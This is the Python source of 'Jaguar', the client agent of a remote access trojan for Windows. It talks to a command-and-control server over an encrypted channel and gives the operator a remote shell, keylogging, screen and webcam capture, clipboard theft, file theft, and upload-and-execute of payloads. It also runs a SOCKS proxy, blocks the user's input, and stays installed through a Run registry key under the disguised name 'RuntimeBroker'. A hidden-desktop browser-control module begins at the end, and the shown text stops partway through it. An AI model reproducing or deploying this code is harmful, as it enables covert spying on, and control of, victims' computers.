# -*- coding: utf-8 -*-
"""Agente Jaguar - payload cliente.

Protocolo IDENTICO al controlador (jaguar/server/sesion.py + jaguar/common/cripto.py):
  - framing: 4 bytes big-endian (longitud) + payload CIFRADO
  - payload: JSON cifrado con cifrar()/descifrar()
  - handshake agente->servidor: {"tipo":"hola","info":{...}}
  - servidor->agente: {"tipo":"comando","cmd":...,"args":...} | {"tipo":"beacon",...}
  - agente->servidor: {"tipo":"respuesta","cmd":...,"ok":...,"datos":...}

FIX: TODO subprocess usa CREATE_NO_WINDOW -> no aparece ninguna ventana de CMD.
FIX: HVNC envia input al HWND hijo/foco reales (Chrome/Edge/Brave) y es fluido
     (XOR por enteros, escala/calidad/fps configurables, delta por hash).
"""
import base64
import hashlib
import hmac
import io
import json
import os
import platform
import random
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

try:
    import getpass
except Exception:
    getpass = None

HOST = os.environ.get("JAGUAR_HOST", "127.0.0.1")
try:
    PORT = int(os.environ.get("JAGUAR_PORT", "8000"))
except Exception:
    PORT = 8000
FALLBACK = os.environ.get("JAGUAR_HOST2", "")
SLEEP = 3.0
JITTER = 0.2
NOMBRE = "RuntimeBroker"
_WIN = platform.system() == "Windows"

CREATE_NO_WINDOW = 0x08000000

DIR_PERSIST = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                           "Microsoft", "Windows", NOMBRE)

_KLOG = []
_KLOG_ON = False
_PROXY_ON = False
_SALIR = False
_BLOQ = {"on": False}
_WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
_CAP_CFG = {"calidad": 70, "escala": 1.0}


def _sin_consola():
    """Evita que cualquier subprocess abra una ventana de consola."""
    if not _WIN:
        return {}
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    return {"startupinfo": si, "creationflags": CREATE_NO_WINDOW}


# ====================== CRIPTO (idéntico a jaguar/common/cripto.py) ==========
_K_OBF = bytes([
    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
])
_CLAVE_MAESTRA = bytes(b ^ 0x5A for b in _K_OBF)     # b"J4GU4R-2026-clave-compartida"
_SAL = b"jaguar-v1"
_ITER = 100_000
_CI = None
_MA = None


def _cinit():
    global _CI, _MA
    if _CI is None:
        m = hashlib.pbkdf2_hmac("sha256", _CLAVE_MAESTRA, _SAL, _ITER, dklen=64)
        _CI, _MA = m[:32], m[32:]


def _ks(nonce, n):
    _cinit()
    out = bytearray()
    c = 0
    while len(out) < n:
        out += hmac.new(_CI, nonce + struct.pack(">Q", c), hashlib.sha256).digest()
        c += 1
    return bytes(out[:n])


def _xor(a, b):
    """XOR a velocidad C usando enteros grandes (antes: bucle Python)."""
    if not a:
        return b""
    return (int.from_bytes(a, "big") ^ int.from_bytes(b, "big")).to_bytes(len(a), "big")


def cifrar(datos):
    _cinit()
    if isinstance(datos, str):
        datos = datos.encode("utf-8")
    pad = os.urandom(os.urandom(1)[0])
    cuerpo = struct.pack(">H", len(pad)) + pad + datos
    nonce = os.urandom(16)
    ct = _xor(cuerpo, _ks(nonce, len(cuerpo)))
    mac = hmac.new(_MA, nonce + ct, hashlib.sha256).digest()
    return nonce + ct + mac


def descifrar(blob):
    _cinit()
    if len(blob) < 48:
        raise ValueError("trama corta")
    nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
    if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
        raise ValueError("MAC inválido")
    cuerpo = _xor(ct, _ks(nonce, len(ct)))
    return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
# ============================================================================


def _recv(sock, n):
    b = b""
    while len(b) < n:
        c = sock.recv(n - len(b))
        if not c:
            return None
        b += c
    return b


def _enviar(sock, obj):
    d = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    c = cifrar(d)
    sock.sendall(struct.pack(">I", len(c)) + c)


def _recibir(sock):
    cab = _recv(sock, 4)
    if not cab:
        return None
    (n,) = struct.unpack(">I", cab)
    d = _recv(sock, n)
    if d is None:
        return None
    try:
        return json.loads(descifrar(d).decode("utf-8"))
    except Exception:
        return {}


# ============================ LOG persistente ===============================
DIR_LOG = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                       "Microsoft", "Windows", NOMBRE)
RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
_MAX_LOG = 1_000_000


def _log(nivel, txt):
    try:
        os.makedirs(DIR_LOG, exist_ok=True)
        if os.path.isfile(RUTA_LOG) and os.path.getsize(RUTA_LOG) > _MAX_LOG:
            try:
                os.replace(RUTA_LOG, RUTA_LOG + ".1")
            except Exception:
                pass
        with open(RUTA_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{nivel}] {txt}\n")
    except Exception:
        pass


def _log_leer(a):
    n = int(a.get("lineas", 200))
    try:
        with open(RUTA_LOG, encoding="utf-8", errors="replace") as f:
            return {"ruta": RUTA_LOG, "texto": "".join(f.readlines()[-n:])}
    except Exception as e:
        return {"error": str(e), "ruta": RUTA_LOG}
# ============================================================================


def _cfg():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    try:
        puerto = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    except Exception:
        puerto = PORT
    fb = sys.argv[3] if len(sys.argv) > 3 else FALLBACK
    return (host or "127.0.0.1"), puerto, (fb or "")


def _ip_interna():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _usuario():
    try:
        return getpass.getuser() if getpass else (os.environ.get("USERNAME") or "?")
    except Exception:
        return os.environ.get("USERNAME") or "?"


def _sysinfo():
    return {
        "host": socket.gethostname(),
        "usuario": _usuario(),
        "so": f"{platform.system()} {platform.release()}",
        "arquitectura": platform.machine(),
        "ip": _ip_interna(),
        "pid": os.getpid(),
        "exe": sys.executable,
        "cwd": os.getcwd(),
    }


# ------------------------------------------------------------------ handlers
def _ping(a):
    return {"ts": a.get("ts")}


def _shell(a):
    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True,
                       text=True, **_sin_consola())
    return {"salida": (r.stdout or "") + (r.stderr or ""), "codigo": r.returncode}


def _listar_dir(a):
    ruta = a.get("ruta", ".") or "."
    try:
        items = []
        for e in os.scandir(ruta):
            try:
                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": e.stat().st_size})
            except Exception:
                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": 0})
        return {"ruta": os.path.abspath(ruta), "items": items}
    except Exception as e:
        return {"error": str(e)}


def _procesos(a):
    try:
        r = (subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
             if _WIN else subprocess.run(["ps", "aux"], capture_output=True, text=True))
        return {"salida": r.stdout}
    except Exception as e:
        return {"error": str(e)}


def _captura(a):
    """Captura de escritorio. formato='jpeg' + calidad/escala para fluidez."""
    fmt = (a.get("formato") or "png").lower()
    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
    try:
        from PIL import ImageGrab
        try:
            img = ImageGrab.grab(all_screens=True)
        except TypeError:
            img = ImageGrab.grab()
    except Exception:
        img = None
    if img is None:
        return _captura_win(a)
    w, h = img.width, img.height
    if escala != 1.0:
        img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
    buf = io.BytesIO()
    try:
        if fmt == "jpeg":
            img.convert("RGB").save(buf, "JPEG", quality=calidad)
        else:
            img.save(buf, "PNG")
    except Exception as e:
        return {"b64": "", "error": str(e)}
    return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}


def _captura_win(a):
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    hwnd = u.GetDesktopWindow()
    hdc = u.GetWindowDC(hwnd)
    w = u.GetSystemMetrics(0)
    h = u.GetSystemMetrics(1)
    memdc = g.CreateCompatibleDC(hdc)
    bmp = g.CreateCompatibleBitmap(hdc, w, h)
    g.SelectObject(memdc, bmp)
    g.BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                    ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
                    ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth = w
    bi.biHeight = -h
    bi.biPlanes = 1
    bi.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    g.GetDIBits(memdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g.DeleteObject(bmp)
    g.DeleteDC(memdc)
    u.ReleaseDC(hwnd, hdc)
    try:
        from PIL import Image
        img = Image.frombuffer("RGBA", (w, h), buf, "raw", "BGRA", 0, 1)
        b = io.BytesIO()
        img.convert("RGB").save(b, "PNG")
        return {"b64": base64.b64encode(b.getvalue()).decode(), "w": w, "h": h}
    except Exception:
        return {"b64": "", "w": w, "h": h}


def _raton(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    accion = a.get("accion")
    if "x" in a and "y" in a:
        u.SetCursorPos(int(a["x"]), int(a["y"]))
    if accion == "down":
        u.mouse_event(0x0002, 0, 0, 0, 0)
    elif accion == "up":
        u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "right_down":
        u.mouse_event(0x0008, 0, 0, 0, 0)
    elif accion == "right_up":
        u.mouse_event(0x0010, 0, 0, 0, 0)
    elif accion == "doble":
        for _ in range(2):
            u.mouse_event(0x0002, 0, 0, 0, 0)
            u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "scroll":
        u.mouse_event(0x0800, 0, 0, int(a.get("delta", 120)), 0)
    return {}


_SWAP = {"on": False}


def _swap_raton(a):
    if not _WIN:
        return {}
    import ctypes
    _SWAP["on"] = not _SWAP["on"]
    ctypes.windll.user32.SwapMouseButton(1 if _SWAP["on"] else 0)
    return {"estado": "swap", "on": _SWAP["on"]}


def _teclado(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    UP, UNI = 0x0002, 0x0004
    if "vk" in a:
        vk = int(a["vk"])
        u.keybd_event(vk, 0, 0, 0)
        u.keybd_event(vk, 0, UP, 0)
    elif "texto" in a:
        for ch in a["texto"]:
            u.keybd_event(0, ord(ch), UNI, 0)
            u.keybd_event(0, ord(ch), UNI | UP, 0)
    return {}


def _bloquear(a):
    """Bloquea/desbloquea la entrada fisica local (estilo 'capturar teclado')."""
    if not _WIN:
        return {}
    import ctypes
    _BLOQ["on"] = not _BLOQ["on"]
    try:
        ctypes.windll.user32.BlockInput(_BLOQ["on"])
    except Exception:
        pass
    return {"bloqueado": _BLOQ["on"]}


def _clip_get(a):
    if not _WIN:
        return {"texto": ""}
    import ctypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32
    CF_UNICODETEXT = 13
    if not u.OpenClipboard(0):
        return {"texto": ""}
    try:
        h = u.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return {"texto": ""}
        p = k.GlobalLock(h)
        txt = ctypes.wstring_at(p) if p else ""
        k.GlobalUnlock(h)
        return {"texto": txt}
    finally:
        u.CloseClipboard()


def _clip_set(a):
    if not _WIN:
        return {}
    import ctypes
    u = ctypes.windll.user32
    k = ctypes.windll.kernel32
    CF_UNICODETEXT = 13
    GMEM_MOVEABLE = 0x0002
    txt = str(a.get("texto", ""))
    if not u.OpenClipboard(0):
        return {}
    try:
        u.EmptyClipboard()
        datos = (txt + "\x00").encode("utf-16-le")
        h = k.GlobalAlloc(GMEM_MOVEABLE, len(datos))
        p = k.GlobalLock(h)
        ctypes.memmove(p, datos, len(datos))
        k.GlobalUnlock(h)
        u.SetClipboardData(CF_UNICODETEXT, h)
    finally:
        u.CloseClipboard()
    return {"ok": True}


def _webcam(a):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ok, frame = cap.read()
        cap.release()
        if not ok:
            return {"b64": ""}
        ok, buf = cv2.imencode(".jpg", frame)
        return {"b64": base64.b64encode(buf.tobytes()).decode(),
                "w": frame.shape[1], "h": frame.shape[0]}
    except Exception as e:
        return {"b64": "", "error": str(e)}


def _webcam_iniciar(a):
    if _WCAM["on"]:
        return {"estado": "ya activo"}
    _WCAM["on"] = True
    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),), daemon=True).start()
    return {"estado": "iniciado"}


def _wcam_loop(idx):
    try:
        import cv2
    except Exception:
        _WCAM["on"] = False
        return
    cap = cv2.VideoCapture(idx)
    while _WCAM["on"]:
        try:
            ok, frame = cap.read()
            if ok:
                ok2, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if ok2:
                    _WCAM["frame"] = buf.tobytes()
                    _WCAM["w"], _WCAM["h"] = frame.shape[1], frame.shape[0]
        except Exception:
            pass
        time.sleep(0.03)
    cap.release()


def _webcam_frame(a):
    return {"b64": base64.b64encode(_WCAM["frame"]).decode() if _WCAM["frame"] else "",
            "w": _WCAM["w"], "h": _WCAM["h"]}


def _webcam_parar(a):
    _WCAM["on"] = False
    return {"estado": "parado"}


def _keylogger_iniciar(a):
    global _KLOG_ON
    if _KLOG_ON:
        return {"estado": "ya activo"}
    _KLOG_ON = True
    threading.Thread(target=_klog_loop, daemon=True).start()
    return {"estado": "iniciado"}


def _klog_loop():
    if not _WIN:
        return
    import ctypes
    u = ctypes.windll.user32
    while _KLOG_ON:
        for vk in range(8, 256):
            if u.GetAsyncKeyState(vk) & 1:
                _KLOG.append(_vk_texto(vk))
        time.sleep(0.02)


def _vk_texto(vk):
    if vk in (13, 8, 9, 32):
        return {13: "\n", 8: "[BS]", 9: "[TAB]", 32: " "}.get(vk, "")
    if 65 <= vk <= 90:
        import ctypes
        return chr(vk) if ctypes.windll.user32.GetKeyState(16) & 0x8000 else chr(vk + 32)
    if 48 <= vk <= 57:
        return chr(vk)
    return ""


def _keylogger_leer(a):
    global _KLOG
    txt = "".join(_KLOG)
    _KLOG = []
    return {"texto": txt}


def _persistir(a):
    try:
        os.makedirs(DIR_PERSIST, exist_ok=True)
        if getattr(sys, "frozen", False):
            origen = os.path.abspath(sys.executable)
            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
            arranque = f'"{destino}"'
        else:
            origen = os.path.abspath(sys.argv[0])
            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
            arranque = f'"{sys.executable}" "{destino}"'
        if origen.lower() != destino.lower():
            shutil.copy2(origen, destino)
        host, puerto, fb = _cfg()
        arranque += f" {host} {puerto} {fb}"
        if _WIN:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, arranque)
            winreg.CloseKey(k)
            _log("PERSIST", f"instalada -> {destino}")
            return {"persistencia": f"HKCU\\...\\Run[{NOMBRE}]", "copia": destino}
        return {"persistencia": "cron (no-op)", "copia": destino}
    except Exception as e:
        _log("PERSIST", f"error: {e}")
        return {"error": str(e)}


def _abrir_url(a):
    try:
        if _WIN:
            os.startfile(a.get("url", ""))
        else:
            subprocess.Popen(["xdg-open", a.get("url", "")])
    except Exception:
        pass
    return {}


def _mensaje(a):
    if _WIN:
        import ctypes
        txt = a.get("texto", "")
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
                         daemon=True).start()
    return {}


def _descargar(a):
    with open(a.get("ruta", ""), "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(a.get("ruta", "")),
            "b64": base64.b64encode(d).decode(), "tamano": len(d)}


def _subir_ejecutar(a):
    d = base64.b64decode(a.get("b64", ""))
    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
    with open(ruta, "wb") as f:
        f.write(d)
    try:
        subprocess.Popen([ruta], shell=True, **_sin_consola())
    except Exception:
        pass
    return {"ruta": ruta}


def _proxy_iniciar(a):
    global _PROXY_ON
    if _PROXY_ON:
        return {"estado": "ya activo"}
    _PROXY_ON = True
    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),), daemon=True).start()
    return {"estado": "proxy SOCKS5 activo"}


def _proxy_parar(a):
    global _PROXY_ON
    _PROXY_ON = False
    return {"estado": "parado"}


def _socks_loop(puerto):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", puerto))
    srv.listen(20)
    while _PROXY_ON:
        try:
            cli, _ = srv.accept()
        except OSError:
            break
        threading.Thread(target=_socks_atender, args=(cli,), daemon=True).start()


def _socks_atender(cli):
    try:
        cli.recv(2)
        cli.sendall(b"\x05\x00")
        _, _, _, atyp = cli.recv(4)
        if atyp == 1:
            host = socket.inet_ntoa(cli.recv(4))
        elif atyp == 3:
            host = cli.recv(cli.recv(1)[0]).decode()
        else:
            host = socket.inet_ntoa(cli.recv(4))
        puerto = struct.unpack(">H", cli.recv(2))[0]
        remoto = socket.socket()
        remoto.connect((host, puerto))
        cli.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + b"\x00\x00")
        _relay(cli, remoto)
    except Exception:
        try:
            cli.close()
        except Exception:
            pass


def _relay(a, b):
    def bombea(src, dst):
        try:
            while True:
                d = src.recv(65536)
                if not d:
                    break
                dst.sendall(d)
        except Exception:
            pass
        try:
            dst.close()
        except Exception:
            pass
    threading.Thread(target=bombea, args=(a, b), daemon=True).start()
    threading.Thread(target=bombea, args=(b, a), daemon=True).start()


def _desconectar(a):
    global _SALIR
    _SALIR = True
    return {"estado": "adios"}


# ================================== HVNC ====================================
if _WIN:
    import ctypes
    from ctypes import wintypes
    _u32 = ctypes.windll.user32
    _k32 = ctypes.windll.kernel32
    _g32 = ctypes.windll.gdi32
    _advapi32 = ctypes.windll.advapi32

    DESKTOP_ALL = 0x01FF
    DESKTOP_ACCESS = 0x000F0000 | DESKTOP_ALL
    DESKTOP_NAME = "JaguarHVNC"
    PW_RENDERFULLCONTENT = 0x00000002
    _CLASES_BROWSER = ("Chrome_WidgetWin_1", "Chrome_WidgetWin_0",
                       "MozillaWindowClass", "ApplicationFrameWindow")

    class _STARTUPINFOW(ctypes.Structure):
        _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                    ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                    ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                    ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                    ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                    ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                    ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                    ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                    ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                    ("hStdError", wintypes.HANDLE)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                    ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

    class _RECT(ctypes.Structure):
        _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                    ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

    class _POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class _BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    class _BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", _BIH), ("bmiColors", wintypes.DWORD * 3)]

    class _SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("nLength", wintypes.DWORD),
                    ("lpSecurityDescriptor", ctypes.c_void_p),
                    ("bInheritHandle", wintypes.BOOL)]

    class _SECURITY_DESCRIPTOR(ctypes.Structure):
        _fields_ = [("Revision", ctypes.c_ubyte), ("Sbz1", ctypes.c_ubyte),
                    ("Control", wintypes.WORD), ("Owner", ctypes.c_void_p),
                    ("Group", ctypes.c_void_p), ("Sacl", ctypes.c_void_p),
                    ("Dacl", ctypes.c_void_p)]

    class _GUITHREADINFO(ctypes.Structure):
        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
                    ("hwndActive", wintypes.HWND), ("hwndFocus", wintypes.HWND),
                    ("hwndCapture", wintypes.HWND), ("hwndMenuOwner", wintypes.HWND),
                    ("hwndMoveSize", wintypes.HWND), ("hwndCaret", wintypes.HWND),
                    ("rcCaret", _RECT)]

    _u32.CreateDesktopW.restype = wintypes.HANDLE
    _u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
                                    wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    _u32.OpenDesktopW.restype = wintypes.HANDLE
    _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL,
                                  wintypes.DWORD]
    _u32.CloseDesktop.argtypes = [wintypes.HANDLE]
    _u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    _u32.SetThreadDesktop.restype = wintypes.BOOL
    _u32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.LPARAM]
    _u32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(_RECT)]
    _u32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, ctypes.c_int]
    _u32.GetWindowDC.argtypes = [wintypes.HWND]
    _u32.GetWindowDC.restype = wintypes.HDC
    _u32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
    _u32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
    _u32.ScreenToClient.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
    _u32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
    _u32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    _u32.ChildWindowFromPointEx.argtypes = [wintypes.HWND, _POINT, wintypes.UINT]
    _u32.ChildWindowFromPointEx.restype = wintypes.HWND
    _u32.MapWindowPoints.argtypes = [wintypes.HWND, wintypes.HWND,
                                     ctypes.POINTER(_POINT), wintypes.UINT]
    _u32.GetGUIThreadInfo.argtypes = [wintypes.DWORD, ctypes.c_void_p]
    _u32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
    _u32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
                                    ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD,
                                    ctypes.c_void_p, wintypes.LPCWSTR,
                                    ctypes.POINTER(_STARTUPINFOW),
                                    ctypes.POINTER(_PROCESS_INFORMATION)]
    _k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    _k32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
    _k32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
    _k32.GlobalAlloc.restype = ctypes.c_void_p
    _k32.GlobalLock.argtypes = [ctypes.c_void_p]
    _k32.GlobalLock.restype = ctypes.c_void_p
    _g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
    _g32.CreateCompatibleDC.restype = wintypes.HDC
    _g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
    _g32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    _g32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
    _g32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT,
                               ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
    _g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
    _g32.DeleteDC.argtypes = [wintypes.HDC]
    _u32.SetClipboardData.argtypes = [wintypes.UINT, ctypes.c_void_p]
    _advapi32.InitializeSecurityDescriptor.argtypes = [ctypes.c_void_p, wintypes.DWORD]
    _advapi32.SetSecurityDescriptorDacl.argtypes = [ctypes.c_void_p, wintypes.BOOL,
                                                    ctypes.c_void_p, wintypes.BOOL]

    _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

# Flags que hacen que Chrome/Edge pinten y no se duerman en un escritorio oculto.
_FLAGS_CHROMIUM = (
    "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
    "--disable-features=CalculateNativeWinOcclusion "
    "--disable-backgrounding-occluded-windows --disable-renderer-backgrounding "
    "--disable-background-timer-throttling --disable-hang-monitor "
    "--disable-ipc-flooding-protection --disable-session-crashed-bubble "
    "--hide-crash-restore-bubble --noerrdialogs"
)

_HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None, "exe": None,
         "error": None, "estado": "idle", "perfil": None, "hash": None, "_sd": None}

# Calidad/velocidad del HVNC (configurable desde la UI).
_HVNC_CFG = {"calidad": 55, "escala": 0.75, "fps": 8}


def _sec_dacl_null():
    """SECURITY_ATTRIBUTES con DACL NULL: cualquier hijo puede abrir el desktop."""
    sd = _SECURITY_DESCRIPTOR()
    _advapi32.InitializeSecurityDescriptor(ctypes.byref(sd), 1)          # REVISION
    _advapi32.SetSecurityDescriptorDacl(ctypes.byref(sd), True, None, False)
    sa = _SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(_SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = ctypes.cast(ctypes.byref(sd), ctypes.c_void_p)
    sa.bInheritHandle = False
    return sa, sd


def _ruta_navegador(nav):
    """Ruta COMPLETA del navegador (registro App Paths -> PATH -> rutas) o None."""
    nav = (nav or "chrome").lower()
    alias = {
        "chrome": ["chrome.exe"], "google-chrome": ["chrome.exe"],
        "edge": ["msedge.exe"], "msedge": ["msedge.exe"],
        "brave": ["brave.exe"], "opera": ["opera.exe", "launcher.exe"],
        "firefox": ["firefox.exe"],
    }.get(nav, [nav + ".exe"])

    try:
        import winreg
        for exe in alias:
            for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
                try:
                    k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
                                             r"\CurrentVersion\App Paths\\" + exe)
                    ruta = winreg.QueryValueEx(k, "")[0]
                    winreg.CloseKey(k)
                    if ruta and os.path.isfile(ruta):
                        return ruta
                except Exception:
                    pass
    except Exception:
        pass

    for exe in alias:
        r = shutil.which(exe)
        if r:
            return r

    cands = []
    if nav in ("chrome", "google-chrome"):
        cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
                 r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
                 r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
    elif nav in ("edge", "msedge"):
        cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
                 r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
    elif nav == "brave":
        cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
                 r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
    elif nav == "opera":
        cands = [r"%LocalAppData%\Programs\Opera\opera.exe",
                 r"%ProgramFiles%\Opera\opera.exe"]
    elif nav == "firefox":
        cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
                 r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
    for c in cands:
        p = os.path.expandvars(c)
        if p and os.path.isfile(p):
            return p
    return None


def _hvnc_crear_desktop():
    if _HVNC.get("hdesk"):
        return _HVNC["hdesk"]
    h = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not h:
        sa, sd = _sec_dacl_null()
        h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS,
                                ctypes.byref(sa))
        _HVNC["_sd"] = sd
        if not h:
            _log("HVNC", f"CreateDesktopW fallo err={ctypes.GetLastError()}")
    _HVNC["hdesk"] = h
    return h


def _hvnc_crear(exe, linea, desktop):
    """CreateProcess con lpDesktop -> el hijo nace en el escritorio oculto."""
    si = _STARTUPINFOW()
